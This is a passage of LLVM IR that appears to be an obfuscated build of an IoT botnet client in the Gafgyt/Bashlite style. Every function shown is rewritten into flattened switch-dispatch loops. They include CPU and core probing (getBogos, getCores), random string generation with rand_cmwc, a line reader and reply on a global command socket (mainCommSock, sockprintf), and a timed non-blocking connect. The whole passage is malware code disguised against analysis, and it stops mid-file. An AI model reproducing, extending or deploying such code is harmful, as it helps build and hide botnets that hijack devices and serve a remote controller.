  %7 = select i1 %6, i32 1271763603, i32 930370828
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 -1295811761, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 1914675005, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1914675005, label %8
    i32 848440248, label %14
    i32 23666582, label %21
    i32 -965195794, label %24
    i32 -1931193427, label %30
    i32 1690750345, label %36
    i32 1320241322, label %41
    i32 38720003, label %43
    i32 1901994917, label %46
    i32 -1120922543, label %47
    i32 -2037699407, label %57
    i32 1980500627, label %66
    i32 -2018405338, label %68
    i32 96312782, label %74
    i32 758887689, label %79
    i32 -1116614740, label %82
    i32 -1098740860, label %88
    i32 140513902, label %90
    i32 -286931758, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 848440248, i32 140513902
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 23666582, i32 -1098740860
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 -965195794, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 1320241322, i32 -1931193427
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 1320241322, i32 1690750345
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 1320241322, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 38720003, i32 1901994917
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 -965195794, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1120922543, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 1980500627, i32 -2037699407
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 1980500627, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 -2018405338, i32 96312782
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 -1120922543, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 758887689, i32 -1116614740
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 -1116614740, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #2
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 -286931758, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 1914675005, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 -286931758, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 302875338, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 302875338, label %5
    i32 -795188802, label %11
    i32 -804912079, label %18
    i32 147412544, label %21
    i32 -93402632, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 -795188802, i32 -93402632
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 -804912079, i32 147412544
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 147412544, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 302875338, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -921184476, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -921184476, label %6
    i32 -979306450, label %11
    i32 943947949, label %20
    i32 1449468232, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -979306450, i32 1449468232
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 943947949, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 -921184476, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -627788497, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -627788497, label %24
    i32 811507729, label %33
    i32 -6190436, label %50
    i32 102193367, label %51
    i32 -976939266, label %55
    i32 -1997098051, label %60
    i32 1823768203, label %69
    i32 -262154206, label %86
    i32 272145423, label %89
    i32 34292997, label %90
    i32 -1266809327, label %91
    i32 657903364, label %93
    i32 1666103665, label %98
    i32 -427301179, label %103
    i32 -1854817217, label %105
    i32 1918042122, label %113
    i32 -1068365118, label %114
    i32 814173160, label %117
    i32 -540973090, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 811507729, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -6190436, i32 -1266809327
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 102193367, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -976939266, i32 34292997
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 -1997098051, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 1823768203, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -262154206, i32 272145423
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 102193367, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 34292997, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 -1266809327, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 657903364, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 1666103665, i32 814173160
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 -427301179, i32 -1854817217
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 -540973090, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 1918042122, i32 -1068365118
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 814173160, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 657903364, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 -540973090, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 49004771, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 49004771, label %first
    i32 1501486436, label %37
    i32 -429792733, label %38
    i32 1993512769, label %47
    i32 1696645917, label %52
    i32 -2011668366, label %57
    i32 -52153751, label %66
    i32 -2063914048, label %83
    i32 523257347, label %90
    i32 -1988443790, label %91
    i32 -1831617205, label %92
    i32 123126299, label %93
    i32 -1357819071, label %94
    i32 -1150781991, label %95
    i32 1436022616, label %96
    i32 -697743093, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 1501486436, i32 -429792733
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -697743093, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 1993512769, i32 1436022616
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 1696645917, i32 -1357819071
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -2011668366, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -52153751, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -2063914048, i32 -1831617205
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 523257347, i32 -1988443790
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -697743093, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 123126299, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -697743093, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1150781991, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -697743093, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1436022616, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -697743093, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
